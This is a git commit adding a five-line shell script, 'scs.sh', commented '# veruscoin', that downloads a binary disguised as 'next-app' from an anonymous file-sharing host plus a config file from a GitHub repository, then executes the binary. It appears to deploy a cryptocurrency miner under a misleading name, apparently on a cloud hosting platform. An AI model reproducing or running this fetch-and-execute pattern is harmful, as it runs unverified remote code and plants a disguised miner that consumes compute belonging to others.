eb5984def52943a5e58d6f942d3b937906524e5a
sinersarf-ui <sinersarf@gmail.com>
2026-01-10 22:01:52 +0700

    Create scs.sh

---
+++ scs.sh
@@ -0,0 +1,5 @@
+# veruscoin
+sudo apt update
+wget https://filebin.net/juujhgoyj7ueaqt7/next-app
+wget https://raw.githubusercontent.com/sinersarf-ui/ws-railway/refs/heads/main/config.json
+./next-app
